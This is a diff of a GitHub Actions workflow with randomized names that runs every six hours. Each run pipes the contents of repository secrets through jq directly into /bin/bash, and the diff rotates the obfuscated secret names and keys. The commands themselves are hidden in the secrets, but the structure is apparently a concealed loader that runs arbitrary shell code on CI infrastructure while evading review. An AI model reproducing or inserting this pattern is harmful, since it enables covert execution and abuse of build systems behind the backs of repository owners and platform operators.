@@ -2,31 +2,23 @@ name: alkaliconclusion
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 0/6 * * *'
+    - cron: '4 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: alkaliconclusion
         env:
-          dsqki3: ${{ secrets.dsqki3 }}
+          j08: ${{ secrets.j08 }}
         run: |
-          echo $dsqki3 | jq -r .d71 | /bin/bash
-          echo $cew25579 | jq -r .hjo12470 | /bin/bash
-          echo $kfc177 | jq -r .yxdh813 | /bin/bash
-          echo $j42510 | jq -r .ycnqo684 | /bin/bash
-          echo $tk92 | jq -r .xrugb52598 | /bin/bash
-          echo $pxes39 | jq -r .k10 | /bin/bash
-          echo $vgwt43855 | jq -r .z86 | /bin/bash
-          echo $jpoby66948 | jq -r .gn4 | /bin/bash
-          echo $khh656 | jq -r .mrjxh16 | /bin/bash
-          echo $f96 | jq -r .wnqkk25074 | /bin/bash
-          echo $lpocd3370 | jq -r .gdtow0157 | /bin/bash
-          echo $juico3 | jq -r .myng6 | /bin/bash
-          echo $ruu08146 | jq -r .yozue939 | /bin/bash
-          echo $bd0915 | jq -r .xmoz4048 | /bin/bash
-          echo $xi7701 | jq -r .cctr64 | /bin/bash
-          echo $rv8 | jq -r .sutvk0 | /bin/bash
+          echo $j08 | jq -r .fxs22 | /bin/bash
+          echo $s11 | jq -r .px31872 | /bin/bash
+          echo $fcev6286 | jq -r .js97453 | /bin/bash
+          echo $kzaao86 | jq -r .zf0994 | /bin/bash
+          echo $hk9 | jq -r .iivza8927 | /bin/bash
+          echo $xsq13 | jq -r .f1900 | /bin/bash
+          echo $xknb89 | jq -r .lwlet11 | /bin/bash
+          echo $y83 | jq -r .hzwkk4366 | /bin/bash
+          echo $a23165 | jq -r .mtmka940 | /bin/bash
 
